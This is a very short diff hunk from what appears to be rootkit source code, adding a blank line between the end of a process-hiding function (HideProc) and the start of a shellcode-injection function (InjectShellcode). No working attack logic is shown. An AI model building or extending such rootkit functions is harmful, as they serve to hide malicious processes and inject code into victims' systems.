@@ -182,6 +182,7 @@ PCHAR Rootkit::HideProc(UINT32 PID)
 	return (PCHAR)result;
 }
 
+
 PVOID Rootkit::InjectShellcode(Shell* shell)
 {
 	NTSTATUS status = STATUS_SUCCESS;
